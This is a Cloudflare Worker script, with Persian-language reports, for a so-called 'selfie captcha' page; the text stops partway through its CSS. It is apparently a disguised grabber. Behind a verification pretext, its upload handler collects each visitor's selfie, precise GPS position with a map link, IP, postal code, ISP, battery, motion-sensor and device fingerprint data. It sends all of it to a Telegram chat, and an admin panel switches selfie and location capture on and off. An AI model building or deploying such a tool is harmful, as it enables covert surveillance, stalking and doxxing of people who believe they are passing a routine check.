// ============================================================
//  Selfie Captcha Worker — v7 (Geo + Admin Panel)
// ============================================================
//  Env vars:
//    TELEGRAM_BOT_TOKEN   (required)
//    TELEGRAM_CHAT_ID     (required)
//    ADMIN_TOKEN          (required for admin + legacy /on /off)
//    ADMIN_PASSWORD       (STRONGLY recommended — defaults to ADMIN_TOKEN)
//    ADMIN_PATH           (optional — defaults to ADMIN_TOKEN)
//    SESSION_SECRET       (optional)
//    MAX_UPLOAD_BYTES     (optional, default 5MB)
//    RATE_LIMIT_PER_MIN   (optional, default 5)
//
//  KV Binding:
//    SELFIE_STATE  →  KV Namespace  (recommended)
// ============================================================

export default {
  async fetch(request, env, ctx) {
    try {
      const url = new URL(request.url);

      if (url.pathname === '/') {
        if (request.method !== 'GET') return methodNotAllowed(['GET']);
        return await handlePage(request, env);
      }
      if (url.pathname === '/upload') {
        if (request.method !== 'POST') return methodNotAllowed(['POST']);
        return await handleUpload(request, env, ctx);
      }
      if (url.pathname === '/on' || url.pathname === '/off') {
        if (request.method !== 'POST') return methodNotAllowed(['POST']);
        return await handleToggle(request, env, 'selfie', url.pathname === '/on' ? 'on' : 'off');
      }
      if (url.pathname === '/geo/on' || url.pathname === '/geo/off') {
        if (request.method !== 'POST') return methodNotAllowed(['POST']);
        return await handleToggle(request, env, 'geo', url.pathname === '/geo/on' ? 'on' : 'off');
      }
      if (url.pathname === '/state') {
        if (request.method !== 'GET') return methodNotAllowed(['GET']);
        return json({
          selfie: await getState(env, 'selfie', 'on'),
          geo: await getState(env, 'geo', 'off'),
        });
      }

      const adminBase = getAdminBase(env);
      if (adminBase && (url.pathname === adminBase || url.pathname.startsWith(adminBase + '/'))) {
        const sub = url.pathname === adminBase ? '' : url.pathname.slice(adminBase.length + 1);
        return await handleAdmin(request, env, sub, adminBase);
      }

      return new Response('Not Found', { status: 404 });
    } catch (err) {
      console.error('unhandled', err?.stack || err);
      return json({ error: 'internal_error' }, 500);
    }
  },
};

// ============================================================
//  Admin: env helpers
// ============================================================
function getAdminBase(env) {
  const p = env.ADMIN_PATH || env.ADMIN_TOKEN;
  if (!p) return null;
  const clean = String(p).replace(/^\/+|\/+$/g, '');
  return clean ? '/' + clean : null;
}

function getAdminPassword(env) {
  return env.ADMIN_PASSWORD || env.ADMIN_TOKEN || '';
}

// ============================================================
//  State (per-feature: selfie / geo)
// ============================================================
const RECENT_LOG_KEY = 'recent_log';
const RECENT_LOG_MAX = 20;

async function getState(env, key, defaultValue = 'on') {
  if (env.SELFIE_STATE) {
    try {
      const v = await env.SELFIE_STATE.get(key);
      if (v === 'on' || v === 'off') return v;
    } catch (e) {
      console.error('kv get failed', e);
    }
  }
  try {
    const cache = caches.default;
    const hit = await cache.match(new Request(`https://selfie-state.local/${key}`));
    if (hit) {
      const v = await hit.text();
      if (v === 'on' || v === 'off') return v;
    }
  } catch {}
  return defaultValue;
}

async function setState(env, key, state) {
  const value = state === 'off' ? 'off' : 'on';
  if (env.SELFIE_STATE) {
    await env.SELFIE_STATE.put(key, value);
    return { ok: true, storage: 'kv', feature: key, state: value };
  }
  const cache = caches.default;
  await cache.put(
    new Request(`https://selfie-state.local/${key}`),
    new Response(value, {
      headers: { 'Cache-Control': 'public, max-age=31536000' },
    })
  );
  return {
    ok: true,
    storage: 'cache',
    feature: key,
    state: value,
    warning: 'SELFIE_STATE KV not bound — per-colo only',
  };
}

async function getRecentLog(env) {
  if (!env.SELFIE_STATE) return [];
  try {
    const raw = await env.SELFIE_STATE.get(RECENT_LOG_KEY);
    if (!raw) return [];
    const arr = JSON.parse(raw);
    return Array.isArray(arr) ? arr : [];
  } catch {
    return [];
  }
}

async function logSubmission(env, entry) {
  if (!env.SELFIE_STATE) return;
  try {
    const raw = await env.SELFIE_STATE.get(RECENT_LOG_KEY);
    let log = [];
    if (raw) {
      try { log = JSON.parse(raw); } catch {}
    }
    if (!Array.isArray(log)) log = [];
    log.unshift(entry);
    if (log.length > RECENT_LOG_MAX) log.length = RECENT_LOG_MAX;
    await env.SELFIE_STATE.put(RECENT_LOG_KEY, JSON.stringify(log));
  } catch (e) {
    console.error('log failed', e);
  }
}

// ============================================================
//  Admin session (HMAC)
// ============================================================
function adminSessionKey(env) {
  return `admin|${env.ADMIN_TOKEN || ''}|${env.ADMIN_PASSWORD || ''}`;
}

async function issueAdminSession(env, ttlMs = 12 * 3600_000) {
  const ts = String(Date.now());
  const payload = btoa(ts);
  const sig = await hmac(payload, adminSessionKey(env));
  return `${payload}.${sig}`;
}

async function verifyAdminSession(token, env, maxAgeMs = 12 * 3600_000) {
  if (!token || !env.ADMIN_TOKEN) return false;
  try {
    const [payload, sig] = String(token).split('.');
    if (!payload || !sig) return false;
    const expected = await hmac(payload, adminSessionKey(env));
    if (expected.length !== sig.length) return false;
    let diff = 0;
    for (let i = 0; i < expected.length; i++) {
      diff |= expected.charCodeAt(i) ^ sig.charCodeAt(i);
    }
    if (diff !== 0) return false;
    const ts = Number(atob(payload));
    return Number.isFinite(ts) && Date.now() - ts <= maxAgeMs;
  } catch {
    return false;
  }
}

const timingSafeEqual = (a, b) => {
  const A = String(a ?? '');
  const B = String(b ?? '');
  if (A.length !== B.length) return false;
  let diff = 0;
  for (let i = 0; i < A.length; i++) diff |= A.charCodeAt(i) ^ B.charCodeAt(i);
  return diff === 0;
};

// ============================================================
//  Legacy API: /on /off /geo/on /geo/off
// ============================================================
async function handleToggle(request, env, feature, action) {
  if (!env.ADMIN_TOKEN) return json({ error: 'admin_disabled' }, 403);
  const url = new URL(request.url);
  const provided =
    url.searchParams.get('token') || request.headers.get('X-Admin-Token') || '';
  if (!timingSafeEqual(provided, env.ADMIN_TOKEN)) {
    return json({ error: 'unauthorized' }, 401);
  }
  const result = await setState(env, feature, action);
  return json(result);
}

// ============================================================
//  Admin handler
// ============================================================
async function handleAdmin(request, env, sub, adminBase) {
  const ip = request.headers.get('CF-Connecting-IP') || 'unknown';
  const url = new URL(request.url);
  const nonce = crypto.randomUUID().replace(/-/g, '');
  const sessionToken = parseCookie(request.headers.get('Cookie') || '', 'admin_sess');
  const authed = await verifyAdminSession(sessionToken, env);

  if (request.method === 'GET' && sub === '') {
    if (authed) {
      const [selfieState, geoState, log] = await Promise.all([
        getState(env, 'selfie', 'on'),
        getState(env, 'geo', 'off'),
        getRecentLog(env),
      ]);
      return adminResponse(
        renderAdminDashboard(nonce, adminBase, selfieState, geoState, env, request.cf || {}, log, url.searchParams),
        nonce
      );
    }
    return adminResponse(renderAdminLogin(nonce, adminBase, url.searchParams), nonce);
  }

  if (request.method === 'POST' && sub === 'login') {
    const rl = await rateLimit('adminlogin:' + ip, 5, 60);
    if (!rl.allowed) return redirect(adminBase + '?err=rate');

    let password = '';
    try {
      const form = await request.formData();
      password = String(form.get('password') || '');
    } catch {}

    const expected = getAdminPassword(env);
    if (!expected || !timingSafeEqual(password, expected)) {
      await sleep(300);
      return redirect(adminBase + '?err=invalid');
    }
    const token = await issueAdminSession(env);
    return redirect(adminBase + '?ok=login', 303, {
      'Set-Cookie': `admin_sess=${token}; Path=/; HttpOnly; SameSite=Lax; Max-Age=43200; Secure`,
    });
  }

  if (request.method === 'POST' && sub === 'logout') {
    return redirect(adminBase, 303, {
      'Set-Cookie': `admin_sess=; Path=/; HttpOnly; SameSite=Lax; Max-Age=0; Secure`,
    });
  }

  if (request.method === 'POST' && sub === 'toggle') {
    if (!authed) return redirect(adminBase);
    let feature = '';
    let desired = '';
    try {
      const form = await request.formData();
      feature = String(form.get('feature') || '');
      desired = String(form.get('state') || '');
    } catch {}
    if (!['selfie', 'geo'].includes(feature) || !['on', 'off'].includes(desired)) {
      return redirect(adminBase + '?err=state');
    }
    await setState(env, feature, desired);
    return redirect(
      `${adminBase}?ok=toggled&feature=${feature}&state=${desired}`,
      303
    );
  }

  return new Response('Not Found', { status: 404 });
}

// ============================================================
//  GET /
// ============================================================
async function handlePage(request, env) {
  const secret = env.SESSION_SECRET || env.TELEGRAM_BOT_TOKEN;
  const token = await issueToken(secret);
  const nonce = crypto.randomUUID().replace(/-/g, '');
  const selfieState = await getState(env, 'selfie', 'on');
  const geoState = await getState(env, 'geo', 'off');

  const headers = new Headers({
    'Content-Type': 'text/html;charset=UTF-8',
    'Cache-Control': 'no-store, no-cache, must-revalidate, max-age=0',
    'X-Content-Type-Options': 'nosniff',
    'X-Frame-Options': 'DENY',
    'Referrer-Policy': 'no-referrer',
    'Permissions-Policy':
      'camera=(self), microphone=(), geolocation=(self), ' +
      'accelerometer=(self), gyroscope=(self), magnetometer=(self)',
    'Content-Security-Policy': [
      "default-src 'none'",
      `script-src 'nonce-${nonce}'`,
      `style-src 'nonce-${nonce}'`,
      "connect-src 'self'",
      "img-src 'self' data: blob:",
      "media-src 'self' blob:",
      "base-uri 'none'",
      "form-action 'none'",
      "frame-ancestors 'none'",
    ].join('; '),
  });
  headers.set(
    'Set-Cookie',
    `hs_session=${token}; Path=/; HttpOnly; SameSite=Strict; Max-Age=300; Secure`
  );

  return new Response(renderHTML(nonce, selfieState, geoState), { headers });
}

// ============================================================
//  POST /upload
// ============================================================
async function handleUpload(request, env, ctx) {
  const ip = request.headers.get('CF-Connecting-IP') || 'unknown';
  const secret = env.SESSION_SECRET || env.TELEGRAM_BOT_TOKEN;

  const rl = await rateLimit(ip, Number(env.RATE_LIMIT_PER_MIN) || 5, 60);
  if (!rl.allowed) return json({ error: 'rate_limited' }, 429);

  const token = parseCookie(request.headers.get('Cookie') || '', 'hs_session');
  if (!token || !(await verifyToken(token, secret))) {
    return json({ error: 'invalid_session' }, 403);
  }

  let form;
  try {
    form = await request.formData();
  } catch {
    return json({ error: 'invalid_multipart' }, 400);
  }

  const selfieMode = await getState(env, 'selfie', 'on');
  const geoMode = await getState(env, 'geo', 'off');

  const photo = form.get('photo');
  const clientDataRaw = form.get('clientData');

  if (selfieMode === 'on') {
    if (!(photo instanceof File)) return json({ error: 'missing_photo' }, 400);
    const maxBytes = Number(env.MAX_UPLOAD_BYTES) || 5 * 1024 * 1024;
    if (photo.size === 0) return json({ error: 'empty_photo' }, 400);
    if (photo.size > maxBytes) return json({ error: 'photo_too_large' }, 413);
    if (!/^image\/(jpeg|png|webp)$/.test(photo.type)) {
      return json({ error: 'invalid_mime' }, 415);
    }
  }

  let clientInfo = {};
  try {
    clientInfo = JSON.parse(clientDataRaw || '{}');
  } catch {
    clientInfo = { _parseError: 'invalid json' };
  }

  const cf = request.cf || {};
  const serverInfo = {
    ip,
    country: cf.country,
    countryName: cf.countryName,
    continent: cf.continent,
    city: cf.city,
    region: cf.region,
    regionCode: cf.regionCode,
    postalCode: cf.postalCode,
    latitude: cf.latitude,
    longitude: cf.longitude,
    timezone: cf.timezone,
    isEUCountry: cf.isEUCountry,
    isp: cf.asOrganization,
    asn: cf.asn,
    metroCode: cf.metroCode,
    httpProtocol: cf.httpProtocol,
    tlsVersion: cf.tlsVersion,
    tlsCipher: cf.tlsCipher,
    clientTcpRtt: cf.clientTcpRtt,
    colo: cf.colo,
    userAgent: request.headers.get('User-Agent'),
    acceptLanguage: request.headers.get('Accept-Language'),
    acceptEncoding: request.headers.get('Accept-Encoding'),
    referer: request.headers.get('Referer'),
    botScore: cf.botManagement?.score,
    verifiedBot: cf.botManagement?.verifiedBot,
  };

  const sessionId = crypto.randomUUID().slice(0, 8);
  const reportHtml = buildReport(sessionId, serverInfo, clientInfo, selfieMode, geoMode);

  const tg = new TelegramClient(env.TELEGRAM_BOT_TOKEN, env.TELEGRAM_CHAT_ID);
  const results = [];

  if (selfieMode === 'on' && photo instanceof File) {
    const photoRes = await tg.sendPhoto(
      photo,
      `📸 <b>سلفی دریافتی</b>\nشناسه: <code>${sessionId}</code>`
    );
    results.push({ step: 'photo', ok: !!photoRes.ok });
  }

  for (const [i, chunk] of chunkByLines(reportHtml).entries()) {
    const r = await tg.sendMessage(chunk);
    results.push({ step: `report_${i + 1}`, ok: !!r.ok });
    await sleep(300);
  }

  const rawJson = JSON.stringify(
    { sessionId, at: new Date().toISOString(), selfieMode, geoMode, serverInfo, clientInfo },
    null,
    2
  );
  const docRes = await tg.sendDocument(
    new Blob([rawJson], { type: 'application/json' }),
    `data_${sessionId}.json`,
    `📄 داده خام • <code>${sessionId}</code> • سلفی: <b>${selfieMode}</b> • موقعیت: <b>${geoMode}</b>`
  );
  results.push({ step: 'raw_json', ok: !!docRes.ok });

  if (ctx && ctx.waitUntil) {
    const geo = clientInfo.geolocation || {};
    ctx.waitUntil(
      logSubmission(env, {
        ts: Date.now(),
        sessionId,
        ip,
        country: cf.country || null,
        city: cf.city || null,
        selfieMode,
        geoMode,
        lat: geo.success ? geo.latitude : null,
        lon: geo.success ? geo.longitude : null,
        accuracy: geo.success ? Math.round(geo.accuracy) : null,
        ua: String(request.headers.get('User-Agent') || '').slice(0, 80),
      })
    );
  }

  if (!results.some((r) => r.ok)) {
    return json({ error: 'telegram_failed', results }, 502);
  }
  return json({ ok: true, sessionId, selfieMode, geoMode, results });
}

// ============================================================
//  Telegram client
// ============================================================
class TelegramClient {
  constructor(token, chatId) {
    this.token = token;
    this.chatId = chatId;
    this.base = `https://api.telegram.org/bot${token}`;
  }
  sendPhoto(blob, caption) {
    const fd = new FormData();
    fd.append('chat_id', this.chatId);
    fd.append('photo', blob, 'selfie.jpg');
    fd.append('caption', caption);
    fd.append('parse_mode', 'HTML');
    return this._call('sendPhoto', fd);
  }
  sendMessage(text) {
    return this._call(
      'sendMessage',
      JSON.stringify({
        chat_id: this.chatId,
        text,
        parse_mode: 'HTML',
        disable_web_page_preview: true,
      }),
      { 'Content-Type': 'application/json' }
    );
  }
  sendDocument(blob, filename, caption) {
    const fd = new FormData();
    fd.append('chat_id', this.chatId);
    fd.append('document', blob, filename);
    fd.append('caption', caption);
    fd.append('parse_mode', 'HTML');
    return this._call('sendDocument', fd);
  }
  async _call(method, body, headers = {}) {
    try {
      const res = await fetch(`${this.base}/${method}`, { method: 'POST', headers, body });
      const data = await res.json();
      if (!data.ok) console.error(`telegram ${method}`, data);
      return data;
    } catch (e) {
      console.error(`telegram ${method} exception`, e);
      return { ok: false, description: String(e) };
    }
  }
}

// ============================================================
//  Report builder
// ============================================================
function buildReport(sessionId, server, client, selfieMode, geoMode) {
  const esc = escapeHtml;
  const cam = client.camera || {};
  const frame = client.capturedFrame || {};
  const orientation = client.orientation || {};
  const battery = client.battery || {};
  const geo = client.geolocation || {};
  const zoom = cam.zoom;
  const iso = cam.iso;
  const when = client.utcTime || client.localTime || new Date().toISOString();

  let geoBlock;
  if (geoMode === 'off') {
    geoBlock = `<pre>🔒 غیرفعال — توسط ادمین خاموش شده</pre>`;
  } else if (geo.skipped) {
    geoBlock = `<pre>درخواست نشد</pre>`;
  } else if (!geo.supported) {
    geoBlock = `<pre>مرورگر از Geolocation پشتیبانی نمی‌کند</pre>`;
  } else if (geo.success) {
    const lat = fmtCoord(geo.latitude);
    const lon = fmtCoord(geo.longitude);
    const mapUrl = `https://www.google.com/maps/search/?api=1&query=${lat},${lon}`;
    geoBlock = `<pre>مختصات:     ${lat}, ${lon}
دقت:         ${Math.round(geo.accuracy)} متر (${labelPrecision(geo.accuracy)})
ارتفاع:      ${geo.altitude != null ? Math.round(geo.altitude) + ' m' : '—'}
دقت ارتفاع:  ${geo.altitudeAccuracy != null ? Math.round(geo.altitudeAccuracy) + ' m' : '—'}
جهت:         ${geo.heading != null ? Math.round(geo.heading) + '°' : '—'}
سرعت:        ${geo.speed != null ? geo.speed.toFixed(2) + ' m/s' : '—'}
زمان ثبت:    ${new Date(geo.timestamp).toISOString()}</pre>
<a href="${esc(mapUrl)}">🗺 باز کردن در نقشه</a>`;
  } else {
    geoBlock = `<pre>دریافت نشد: ${esc(geo.error || 'unknown')}${
      geo.message ? '\n' + esc(geo.message) : ''
    }</pre>`;
  }

  const lines = [
    `🔐 <b>گزارش سلفی</b>`,
    `<i>شناسه:</i> <code>${sessionId}</code>`,
    `<i>سلفی:</i> ${selfieMode === 'on' ? '🟢 روشن' : '🔴 خاموش'} • <i>موقعیت:</i> ${geoMode === 'on' ? '🟢 روشن' : '🔴 خاموش'}`,
    `<i>زمان:</i> ${esc(when)}`,
    ``,

    `📍 <b>موقعیت دقیق (GPS)</b>`,
    geoBlock,
    ``,

    `🔋 <b>وضعیت باتری</b>`,
    battery.supported === false
      ? `<pre>در دسترس نیست (${esc(battery.reason || battery.error || 'unsupported')})</pre>`
      : `<pre>سطح:        ${battery.percent != null ? battery.percent + '%' : '—'}
شارژ:       ${battery.charging === true ? 'در حال شارژ ⚡' : battery.charging === false ? 'شارژ نمی‌شود' : '—'}
تا پر شدن:  ${fmtSeconds(battery.chargingTime)}
تا خالی:    ${fmtSeconds(battery.dischargingTime)}</pre>`,
    ``,

    `🧭 <b>وضعیت دستگاه (ژیروسکوپ)</b>`,
    orientation.supported === false
      ? `<pre>پشتیبانی نمی‌شود (${esc(orientation.reason || 'unknown')})</pre>`
      : orientation.average
        ? `<pre>وضعیت:      ${esc(orientation.posture || '—')}
Alpha (Z):  ${fmtNum(orientation.average.alpha)}°
Beta  (X):  ${fmtNum(orientation.average.beta)}°
Gamma (Y):  ${fmtNum(orientation.average.gamma)}°
صفحه:       ${esc(orientation.screenOrientation?.type || '—')} (${esc(orientation.screenOrientation?.angle ?? '—')}°)
نمونه‌ها:   ${esc(orientation.sampleCount || 0)}</pre>`
        : `<pre>داده‌ای دریافت نشد (${esc(orientation.note || 'no_data')})</pre>`,
    ``,

    `🌐 <b>اطلاعات شبکه</b>`,
    `<pre>IP:          ${esc(server.ip)}
کشور:       ${esc(server.country)} (${esc(server.countryName)})
قاره:       ${esc(server.continent)}
شهر:        ${esc(server.city)}
منطقه:      ${esc(server.region)} / ${esc(server.regionCode)}
کدپستی:     ${esc(server.postalCode)}
مختصات:     ${esc(server.latitude)}, ${esc(server.longitude)}
منطقه زمان: ${esc(server.timezone)}
EU:         ${server.isEUCountry === '1' ? 'بله' : 'خیر'}
ISP:        ${esc(server.isp)}
ASN:        ${esc(server.asn)}
MetroCode:  ${esc(server.metroCode)}
HTTP:       ${esc(server.httpProtocol)}
TLS:        ${esc(server.tlsVersion)} / ${esc(server.tlsCipher)}
RTT:        ${esc(server.clientTcpRtt)} ms
Colo:       ${esc(server.colo)}</pre>`,
    `UA: <code>${esc(server.userAgent)}</code>`,
    `Lang: ${esc(server.acceptLanguage)}`,
    `Encoding: ${esc(server.acceptEncoding)}`,
    `Referer: ${esc(server.referer)}`,
    `BotScore: ${esc(server.botScore ?? '—')}`,
    ``,

    `📷 <b>اطلاعات دوربین</b>`,
    selfieMode === 'on'
      ? `<pre>نوع:         ${esc(cam.facingMode || '—')}
رزولوشن:     ${esc(cam.width || '?')}×${esc(cam.height || '?')}
فریم ریت:    ${esc(cam.frameRate || '?')} fps
نسبت:        ${esc(cam.aspectRatio || '—')}
Focus:       ${esc(cam.focusMode || '—')}
Exposure:    ${esc(cam.exposureMode || '—')}
WB:          ${esc(cam.whiteBalanceMode || '—')}
Torch:       ${cam.hasTorch ? 'دارد' : 'ندارد'}
Zoom:        ${zoom ? `${zoom.min}–${zoom.max}` : '—'}
ISO:         ${iso ? `${iso.min}–${iso.max}` : '—'}
دستگاه‌ها:    ${esc(cam.videoDeviceCount)} دوربین / ${esc(cam.audioDeviceCount)} میکروفن
فریم نهایی:  ${esc(frame.width || '?')}×${esc(frame.height || '?')} (${Math.round((frame.size || 0) / 1024)} KB)</pre>`
      : `<pre>غیرفعال — دوربین در حالت خاموش درخواست نشد</pre>`,
    selfieMode === 'on' && cam.videoDeviceLabels && cam.videoDeviceLabels.length
      ? `<i>لیبل دستگاه‌ها:</i> ${esc(cam.videoDeviceLabels.join(' • '))}`
      : ``,
    ``,

    `💻 <b>اطلاعات مرورگر</b>`,
    `<pre>User-Agent: ${esc(client.userAgent)}
زبان:       ${esc(client.language)}
زبان‌ها:     ${esc((client.languages || []).join(', '))}
پلتفرم:     ${esc(client.platform)}
صفحه:       ${esc(client.screenWidth)}×${esc(client.screenHeight)}
پنجره:      ${esc(client.innerWidth)}×${esc(client.innerHeight)}
DPR:        ${esc(client.devicePixelRatio)}
CPU:        ${esc(client.hardwareConcurrency)} هسته
RAM:        ${esc(client.deviceMemory)} GB
اتصال:      ${esc(client.connectionType)}
زمان محلی:  ${esc(client.localTime)}
UTC:        ${esc(client.utcTime)}
TZ:         ${esc(client.timezone)}
آنلاین:     ${client.onLine ? 'بله' : 'خیر'}
کوکی:       ${client.cookieEnabled ? 'بله' : 'خیر'}
DNT:        ${esc(client.doNotTrack)}
PDF:        ${client.pdfViewerEnabled ? 'بله' : 'خیر'}</pre>`,
  ];

  return lines.filter(Boolean).join('\n');
}

// ============================================================
//  Helpers
// ============================================================
const escapeHtml = (v) =>
  String(v ?? '—')
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;');

const fmtNum = (n, digits = 1) =>
  typeof n === 'number' && isFinite(n) ? n.toFixed(digits) : '—';

const fmtCoord = (n) =>
  typeof n === 'number' && isFinite(n) ? n.toFixed(6) : '—';

const fmtSeconds = (s) => {
  if (typeof s !== 'number' || !isFinite(s) || s <= 0) return '—';
  const h = Math.floor(s / 3600);
  const m = Math.floor((s % 3600) / 60);
  if (h > 0) return `${h} ساعت ${m} دقیقه`;
  if (m > 0) return `${m} دقیقه`;
  return `${Math.floor(s)} ثانیه`;
};

const labelPrecision = (acc) => {
  if (typeof acc !== 'number' || !isFinite(acc)) return '—';
  if (acc < 20) return 'عالی (GPS)';
  if (acc < 50) return 'بالا (GPS)';
  if (acc < 200) return 'متوسط (Wi-Fi)';
  if (acc < 1000) return 'پایین (شبکه)';
  return 'تقریبی (IP)';
};

async function issueToken(secret) {
  const ts = String(Date.now());
  const payload = btoa(ts);
  const sig = await hmac(payload, secret);
  return `${payload}.${sig}`;
}
async function verifyToken(token, secret, maxAgeMs = 5 * 60_000) {
  try {
    const [payload, sig] = String(token).split('.');
    if (!payload || !sig) return false;
    const expected = await hmac(payload, secret);
    if (expected.length !== sig.length) return false;
    let diff = 0;
    for (let i = 0; i < expected.length; i++) {
      diff |= expected.charCodeAt(i) ^ sig.charCodeAt(i);
    }
    if (diff !== 0) return false;
    const ts = Number(atob(payload));
    return Number.isFinite(ts) && Date.now() - ts <= maxAgeMs;
  } catch {
    return false;
  }
}
async function hmac(data, secret) {
  const key = await crypto.subtle.importKey(
    'raw',
    new TextEncoder().encode(secret),
    { name: 'HMAC', hash: 'SHA-256' },
    false,
    ['sign']
  );
  const buf = await crypto.subtle.sign('HMAC', key, new TextEncoder().encode(data));
  return btoa(String.fromCharCode(...new Uint8Array(buf)))
    .replace(/\+/g, '-')
    .replace(/\//g, '_')
    .replace(/=+$/, '');
}

async function rateLimit(ip, limit, windowSec) {
  const cache = caches.default;
  const key = new Request(`https://ratelimit.local/${encodeURIComponent(ip)}`);
  const hit = await cache.match(key);
  const count = hit ? Number(await hit.text()) || 0 : 0;
  if (count >= limit) return { allowed: false, remaining: 0 };
  await cache.put(
    key,
    new Response(String(count + 1), {
      headers: { 'Cache-Control': `public, max-age=${windowSec}` },
    })
  );
  return { allowed: true, remaining: limit - count - 1 };
}

function parseCookie(header, name) {
  for (const part of header.split(';')) {
    const [k, ...rest] = part.trim().split('=');
    if (k === name) return rest.join('=');
  }
  return null;
}
function chunkByLines(text, size = 4000) {
  const out = [];
  let current = '';
  for (const line of text.split('\n')) {
    if (current && (current + '\n' + line).length > size) {
      out.push(current);
      current = line;
    } else {
      current = current ? current + '\n' + line : line;
    }
  }
  if (current) out.push(current);
  return out;
}
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const json = (obj, status = 200) =>
  new Response(JSON.stringify(obj), {
    status,
    headers: { 'Content-Type': 'application/json', 'Cache-Control': 'no-store' },
  });
const methodNotAllowed = (allowed) =>
  new Response('Method Not Allowed', {
    status: 405,
    headers: { Allow: allowed.join(', ') },
  });
const redirect = (location, status = 302, extraHeaders = {}) => {
  const headers = new Headers({ Location: location, 'Cache-Control': 'no-store' });
  for (const [k, v] of Object.entries(extraHeaders)) headers.set(k, v);
  return new Response(null, { status, headers });
};

function adminResponse(html, nonce) {
  return new Response(html, {
    headers: {
      'Content-Type': 'text/html;charset=UTF-8',
      'Cache-Control': 'no-store, no-cache, must-revalidate, max-age=0',
      'X-Content-Type-Options': 'nosniff',
      'X-Frame-Options': 'DENY',
      'Referrer-Policy': 'no-referrer',
      'Content-Security-Policy': [
        "default-src 'none'",
        `script-src 'nonce-${nonce}'`,
        `style-src 'nonce-${nonce}'`,
        "connect-src 'self'",
        "img-src 'self' data:",
        "base-uri 'none'",
        "form-action 'self'",
        "frame-ancestors 'none'",
      ].join('; '),
    },
  });
}

// ============================================================
//  Admin: shared CSS
// ============================================================
const ADMIN_CSS = `
  :root {
    --accent:#4a90e2; --ok:#22a06b; --ok-bg:#e8f7ef; --ok-border:#b7e6cd;
    --err:#d93636; --err-bg:#fdeaea; --err-border:#f3c2c2;
    --warn:#e07c2d; --warn-bg:#fdf3e8;
    --muted:#6b7280; --border:#dcdfe4; --bg:#f5f6f8; --text:#1f2328;
  }
  * { box-sizing: border-box; }
  html, body { margin: 0; min-height: 100%; }
  body {
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto,
                 "Helvetica Neue", Arial, sans-serif;
    background: var(--bg); color: var(--text); padding: 16px;
    display: flex; align-items: flex-start; justify-content: center;
  }
  .wrap { width: 100%; max-width: 680px; }
  .card {
    background:#fff; border:1px solid var(--border); border-radius:14px;
    box-shadow: 0 6px 24px rgba(15,23,42,.06); padding: 20px;
  }
  h1 { font-size:18px; margin:0; }
  h2 { font-size:15px; margin: 0 0 12px; }
  .subtitle { color: var(--muted); font-size:13px; margin: 4px 0 18px; }
  .alert { padding: 10px 12px; border-radius: 8px; font-size: 13px; margin-bottom: 14px; }
  .alert.err { background: var(--err-bg); color: var(--err); }
  .alert.ok  { background: var(--ok-bg);  color: var(--ok); }
  input[type=password] {
    width: 100%; padding: 12px 14px; font-size: 15px;
    border: 1px solid var(--border); border-radius: 10px;
    background: #fff; color: var(--text); outline: none; transition: border-color .15s;
  }
  input[type=password]:focus { border-color: var(--accent); }
  .btn {
    display: inline-flex; align-items: center; justify-content: center; gap: 8px;
    padding: 11px 16px; font-size: 14px; font-weight: 500;
    border: 1px solid var(--border); border-radius: 10px;
    background:#fff; color: var(--text); cursor:pointer; text-decoration:none;
    transition: all .15s; font-family: inherit;
  }
  .btn:hover { background: #f3f4f6; }
  .btn-primary { background: var(--accent); border-color: var(--accent); color:#fff; }
  .btn-primary:hover { filter: brightness(1.05); }
  .btn-danger { background: var(--err); border-color: var(--err); color:#fff; }
  .btn-danger:hover { filter: brightness(1.05); }
  .btn-success { background: var(--ok); border-color: var(--ok); color:#fff; }
  .btn-success:hover { filter: brightness(1.05); }
  .btn-block { width: 100%; }
  .btn-sm { padding: 7px 12px; font-size: 12px; }
  .login-icon { font-size: 36px; text-align:center; margin-bottom: 8px; }
  .login-card h1, .login-card .subtitle { text-align: center; }
  .row-between {
    display: flex; align-items: center; justify-content: space-between; gap: 12px;
    margin-bottom: 16px;
  }
  .toolbar {
    display: flex; gap: 8px; flex-wrap: wrap; justify-content: center;
    margin-bottom: 16px;
  }
  .features-grid {
    display: grid; grid-template-columns: 1fr; gap: 14px; margin-bottom: 18px;
  }
  @media (min-width: 500px) { .features-grid { grid-template-columns: 1fr 1fr; } }
  .feature-card {
    border: 1px solid var(--border); border-radius: 12px; padding: 16px;
    background: #fff; display: flex; flex-direction: column;
    transition: all .2s;
  }
  .feature-card.active { border-color: var(--ok-border); background: #f7fdfa; }
  .feature-card.inactive { border-color: var(--err-border); background: #fefafa; }
  .feature-head { display: flex; align-items: center; gap: 10px; margin-bottom: 10px; }
  .feature-icon { font-size: 22px; line-height: 1; }
  .feature-title { font-weight: 600; font-size: 14px; flex: 1; }
  .feature-status {
    font-size: 11px; padding: 3px 8px; border-radius: 20px; font-weight: 600;
    white-space: nowrap;
  }
  .feature-status.on  { background: var(--ok-bg);  color: var(--ok); }
  .feature-status.off { background: var(--err-bg); color: var(--err); }
  .feature-hint {
    font-size: 12px; color: var(--muted); margin-bottom: 12px;
    line-height: 1.6; flex: 1;
  }
  .info-grid {
    display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-bottom: 18px;
  }
  .info-item {
    background: #fafbfc; border: 1px solid var(--border);
    border-radius: 10px; padding: 10px 12px;
  }
  .info-label { font-size: 11px; color: var(--muted); display:block; margin-bottom: 3px; }
  .info-value { font-size: 13px; font-weight: 500; }
  .info-value.small { font-size: 11px; }
  code { font-family: ui-monospace, SFMono-Regular, Menlo, monospace; font-size: 12px; }
  .table-wrap { overflow-x: auto; -webkit-overflow-scrolling: touch; }
  table { width: 100%; border-collapse: collapse; font-size: 12px; min-width: 480px; }
  th, td { padding: 8px 6px; text-align: right; border-bottom: 1px solid var(--border); }
  th { color: var(--muted); font-weight: 500; background: #fafbfc; }
  tr:last-child td { border-bottom: none; }
  .empty { text-align: center; color: var(--muted); padding: 16px !important; }
  .map-link {
    color: var(--accent); text-decoration: none; font-family: ui-monospace, monospace;
    font-size: 11px;
  }
  .map-link:hover { text-decoration: underline; }
  .checks {
    display: grid; grid-template-columns: repeat(2, 1fr); gap: 8px 16px;
    font-size: 12px; padding: 12px; background: #fafbfc;
    border: 1px solid var(--border); border-radius: 10px;
  }
  .checks .ck { display: flex; align-items: center; gap: 8px; }
  .ck-icon { font-size: 13px; }
  .ck-icon.ok  { color: var(--ok); }
  .ck-icon.miss { color: var(--err); }
  .ck-icon.warn { color: var(--warn); }
